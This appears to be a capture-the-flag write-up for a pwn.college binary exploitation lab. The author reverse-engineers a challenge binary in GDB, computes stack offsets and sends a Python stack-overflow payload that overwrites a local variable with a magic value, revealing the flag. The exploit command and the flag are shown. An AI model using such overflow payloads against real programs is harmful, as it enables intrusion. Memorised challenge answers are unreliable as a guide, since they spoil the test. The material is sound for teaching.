## Challenge

This challenge is identical to its "easy" version from a security perspective, but has the following changes:

- Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
- The source code is not provided. You will need to reverse-engineer the binary, but remember, the challenge is conceptually the same as the easy version, so it can be helpful to have the easy version's source code as a secondary reference during your reversing process!
- Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

## Solution

Since source code is not provided, I used GDB to reverse engineer the binary

```bash
hacker@binary-exploitation~variable-control-hard:~$ cd /challenge
hacker@binary-exploitation~variable-control-hard:/challenge$ ls -la
total 36
drwxr-xr-x 1 root root  4096 Oct 21 12:58 .
drwxr-xr-x 1 root root  4096 Oct 21 12:58 ..
-rwsr-xr-x 1 root root   693 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 21376 Jan 27  2025 binary-exploitation-var-control
hacker@binary-exploitation~variable-control-hard:/challenge$ gdb ./binary-exploitation-var-control 
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
--Type <RET> for more, q to quit, c to continue without paging--c
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./binary-exploitation-var-control...
(No debugging symbols found in ./binary-exploitation-var-control)
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004021da <+0>:     endbr64
   0x00000000004021de <+4>:     push   %rbp
   0x00000000004021df <+5>:     mov    %rsp,%rbp
   0x00000000004021e2 <+8>:     sub    $0x1000,%rsp
   0x00000000004021e9 <+15>:    orq    $0x0,(%rsp)
   0x00000000004021ee <+20>:    sub    $0x30,%rsp--Type <RET> for more, q to quit, c to continue without paging--c

   0x00000000004021f2 <+24>:    mov    %edi,-0x1014(%rbp)
   0x00000000004021f8 <+30>:    mov    %rsi,-0x1020(%rbp)
   0x00000000004021ff <+37>:    mov    %rdx,-0x1028(%rbp)
   0x0000000000402206 <+44>:    mov    %fs:0x28,%rax
   0x000000000040220f <+53>:    mov    %rax,-0x8(%rbp)
   0x0000000000402213 <+57>:    xor    %eax,%eax
   0x0000000000402215 <+59>:    mov    0x2e14(%rip),%rax        # 0x405030 <stdin@@GLIBC_2.2.5>
   0x000000000040221c <+66>:    mov    $0x0,%ecx
   0x0000000000402221 <+71>:    mov    $0x2,%edx
   0x0000000000402226 <+76>:    mov    $0x0,%esi
   0x000000000040222b <+81>:    mov    %rax,%rdi
   0x000000000040222e <+84>:    call   0x401150 <setvbuf@plt>
   0x0000000000402233 <+89>:    mov    0x2de6(%rip),%rax        # 0x405020 <stdout@@GLIBC_2.2.5>
   0x000000000040223a <+96>:    mov    $0x0,%ecx
   0x000000000040223f <+101>:   mov    $0x2,%edx
   0x0000000000402244 <+106>:   mov    $0x0,%esi
   0x0000000000402249 <+111>:   mov    %rax,%rdi
   0x000000000040224c <+114>:   call   0x401150 <setvbuf@plt>
   0x0000000000402251 <+119>:   mov    -0x1028(%rbp),%rdx
   0x0000000000402258 <+126>:   mov    -0x1020(%rbp),%rcx
   0x000000000040225f <+133>:   mov    -0x1014(%rbp),%eax
   0x0000000000402265 <+139>:   mov    %rcx,%rsi
   0x0000000000402268 <+142>:   mov    %eax,%edi
   0x000000000040226a <+144>:   call   0x4020a2 <challenge>
   0x000000000040226f <+149>:   mov    $0x0,%eax
   0x0000000000402274 <+154>:   mov    -0x8(%rbp),%rcx
   0x0000000000402278 <+158>:   xor    %fs:0x28,%rcx
   0x0000000000402281 <+167>:   je     0x402288 <main+174>
   0x0000000000402283 <+169>:   call   0x401110 <__stack_chk_fail@plt>
   0x0000000000402288 <+174>:   leave
   0x0000000000402289 <+175>:   ret
End of assembler dump.
(gdb) disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004020a2 <+0>:     endbr64
   0x00000000004020a6 <+4>:     push   %rbp
   0x00000000004020a7 <+5>:     mov    %rsp,%rbp
   0x00000000004020aa <+8>:     add    $0xffffffffffffff80,%rsp
   0x00000000004020ae <+12>:    mov    %edi,-0x64(%rbp)
   0x00000000004020b1 <+15>:    mov    %rsi,-0x70--Type <RET> for more, q to quit, c to continue without paging--c
(%rbp)
   0x00000000004020b5 <+19>:    mov    %rdx,-0x78(%rbp)
   0x00000000004020b9 <+23>:    mov    %fs:0x28,%rax
   0x00000000004020c2 <+32>:    mov    %rax,-0x8(%rbp)
   0x00000000004020c6 <+36>:    xor    %eax,%eax
   0x00000000004020c8 <+38>:    movq   $0x0,-0x50(%rbp)
   0x00000000004020d0 <+46>:    movq   $0x0,-0x48(%rbp)
   0x00000000004020d8 <+54>:    movq   $0x0,-0x40(%rbp)
   0x00000000004020e0 <+62>:    movq   $0x0,-0x38(%rbp)
   0x00000000004020e8 <+70>:    movq   $0x0,-0x30(%rbp)
   0x00000000004020f0 <+78>:    movq   $0x0,-0x28(%rbp)
   0x00000000004020f8 <+86>:    movq   $0x0,-0x20(%rbp)
   0x0000000000402100 <+94>:    movq   $0x0,-0x18(%rbp)
   0x0000000000402108 <+102>:   movq   $0x0,-0x10(%rbp)
   0x0000000000402110 <+110>:   movq   $0x0,-0x58(%rbp)
   0x0000000000402118 <+118>:   movq   $0x1000,-0x58(%rbp)
   0x0000000000402120 <+126>:   mov    -0x58(%rbp),%rax
   0x0000000000402124 <+130>:   mov    %rax,%rsi
   0x0000000000402127 <+133>:   lea    0xfe2(%rip),%rdi        # 0x403110
   0x000000000040212e <+140>:   mov    $0x0,%eax
   0x0000000000402133 <+145>:   call   0x401120 <printf@plt>
   0x0000000000402138 <+150>:   mov    -0x58(%rbp),%rdx
   0x000000000040213c <+154>:   lea    -0x50(%rbp),%rax
   0x0000000000402140 <+158>:   mov    %rax,%rsi
   0x0000000000402143 <+161>:   mov    $0x0,%edi
   0x0000000000402148 <+166>:   call   0x401140 <read@plt>
   0x000000000040214d <+171>:   mov    %eax,-0x5c(%rbp)
   0x0000000000402150 <+174>:   cmpl   $0x0,-0x5c(%rbp)
   0x0000000000402154 <+178>:   jns    0x402182 <challenge+224>
   0x0000000000402156 <+180>:   call   0x4010e0 <__errno_location@plt>
   0x000000000040215b <+185>:   mov    (%rax),%eax
   0x000000000040215d <+187>:   mov    %eax,%edi
   0x000000000040215f <+189>:   call   0x401180 <strerror@plt>
   0x0000000000402164 <+194>:   mov    %rax,%rsi
   0x0000000000402167 <+197>:   lea    0xfca(%rip),%rdi        # 0x403138
   0x000000000040216e <+204>:   mov    $0x0,%eax
   0x0000000000402173 <+209>:   call   0x401120 <printf@plt>
   0x0000000000402178 <+214>:   mov    $0x1,%edi
   0x000000000040217d <+219>:   call   0x401170 <exit@plt>
   0x0000000000402182 <+224>:   mov    -0xc(%rbp),%eax
   0x0000000000402185 <+227>:   test   %eax,%eax
   0x0000000000402187 <+229>:   je     0x40219f <challenge+253>
   0x0000000000402189 <+231>:   lea    0xfd0(%rip),%rdi        # 0x403160
   0x0000000000402190 <+238>:   call   0x4010f0 <puts@plt>
   0x0000000000402195 <+243>:   mov    $0x1,%edi
   0x000000000040219a <+248>:   call   0x401170 <exit@plt>
   0x000000000040219f <+253>:   mov    -0x10(%rbp),%eax
   0x00000000004021a2 <+256>:   cmp    $0x506e58b,%eax
   0x00000000004021a7 <+261>:   jne    0x4021b3 <challenge+273>
   0x00000000004021a9 <+263>:   mov    $0x0,%eax
   0x00000000004021ae <+268>:   call   0x401f9b <win>
   0x00000000004021b3 <+273>:   lea    0xfc6(%rip),%rdi        # 0x403180
   0x00000000004021ba <+280>:   call   0x4010f0 <puts@plt>
   0x00000000004021bf <+285>:   mov    $0x0,%eax
   0x00000000004021c4 <+290>:   mov    -0x8(%rbp),%rcx
   0x00000000004021c8 <+294>:   xor    %fs:0x28,%rcx
   0x00000000004021d1 <+303>:   je     0x4021d8 <challenge+310>
   0x00000000004021d3 <+305>:   call   0x401110 <__stack_chk_fail@plt>
   0x00000000004021d8 <+310>:   leave
   0x00000000004021d9 <+311>:   ret
End of assembler dump.
(gdb) exit
```

On analyzing,
- Buffer start: `rbp-0x50`
- Win variable: `rbp-0x10`. So offset from buffer = `0x50 - 0x10` = `0x40` = 64 bytes
- Lose variable: `rbp-0xc`. So offset from buffer = `0x50 - 0x0c` = `0x44` = 68 bytes

For the payload, I need to fill exactly 64 bytes to reach `win_variable` and extra 4 bytes to `win_variable`

```bash
hacker@binary-exploitation~variable-control-hard:/challenge$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x8b\xe5\x06\x05')" | ./binary-exploitation-var-control
Send your payload (up to 4096 bytes)!
You win! Here is your flag:
pwn.college{sDcPRtODAPh6LQi3nj1WpK07Tfx.dhTNzMDLyMjN0czW}


Goodbye!

```
